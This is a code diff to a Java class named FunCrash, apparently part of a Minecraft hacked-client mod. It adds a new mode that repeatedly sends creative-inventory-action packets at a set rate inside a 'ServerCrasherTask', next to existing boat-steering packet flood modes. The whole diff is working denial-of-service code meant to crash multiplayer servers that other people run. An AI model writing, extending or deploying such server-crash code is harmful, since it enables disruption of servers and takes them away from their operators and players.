@@ -4,6 +4,7 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.inventory.ClickType;
 import net.minecraft.item.ItemStack;
 import net.minecraft.network.play.client.CPacketClickWindow;
+import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
 import net.minecraft.network.play.client.CPacketPlayer;
 import net.minecraft.network.play.client.CPacketSteerBoat;
 import net.minecraft.util.EnumHand;
@@ -60,6 +61,15 @@ public class FunCrash implements Function {
                         Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(true,false));
                         Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(false,true));
                         Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(false,false));
+                    });
+                    break;
+                case ICIA:
+                    task = new ServerCrasherTask(0,this.pps.get(),()->{
+                        if (Minecraft.getMinecraft().getConnection() == null || !this.enabled.get()){
+                            return;
+                        }
+                        ItemStack stack = new ItemStack(Minecraft.getMinecraft().player.getHeldItem(EnumHand.MAIN_HAND).getItem());
+                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCreativeInventoryAction(69,stack));
                     });
                     break;
             }
@@ -144,6 +154,7 @@ public class FunCrash implements Function {
     public enum Mode{
         ISwap,
         IPos,
-        IBoat
+        IBoat,
+        ICIA
     }
 }
